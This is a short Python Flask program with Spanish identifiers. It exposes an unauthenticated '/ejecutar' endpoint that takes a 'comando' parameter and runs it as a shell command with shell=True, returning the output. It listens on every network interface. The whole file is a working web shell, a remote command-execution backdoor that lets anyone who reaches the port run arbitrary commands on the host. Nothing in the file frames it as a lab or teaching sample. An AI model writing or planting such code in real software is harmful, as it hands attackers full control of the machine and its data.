import subprocess
from flask import Flask, request, Response

app = Flask(__name__)


@app.route("/ejecutar", methods=["GET", "POST"])
def ejecutar():
    comando = request.args.get("comando") or request.form.get("comando")
    if not comando:
        return "Error: falta el parámetro 'comando'.", 400
    try:
        resultado = subprocess.run(
            comando,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        salida = resultado.stdout
        if resultado.stderr:
            salida += "\n[STDERR]\n" + resultado.stderr
        return Response(salida, mimetype="text/plain")
    except subprocess.TimeoutExpired:
        return "Error: el comando excedió el timeout de 30 segundos.", 500
    except Exception as e:
        return f"Error: {str(e)}", 500


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)